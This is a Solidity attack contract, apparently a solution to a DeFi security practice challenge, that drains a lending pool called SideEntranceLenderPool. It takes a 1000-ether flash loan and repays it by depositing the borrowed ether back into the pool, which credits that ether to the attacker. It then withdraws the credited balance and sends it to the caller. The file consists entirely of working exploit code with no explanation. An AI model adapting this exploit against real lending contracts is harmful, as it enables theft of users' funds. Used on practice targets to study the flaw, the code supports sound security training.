// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackSideEntrance is IFlashLoanEtherReceiver  {
    SideEntranceLenderPool victim;

    constructor(address _victim) {
        victim = SideEntranceLenderPool(_victim);
    }

    function attack() public returns (bool) {
        victim.flashLoan(1000 ether);
        victim.withdraw();
        (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
        return success;
    }

    function execute() external payable {
        victim.deposit{value: msg.value}();
    }

    receive() external payable {}
}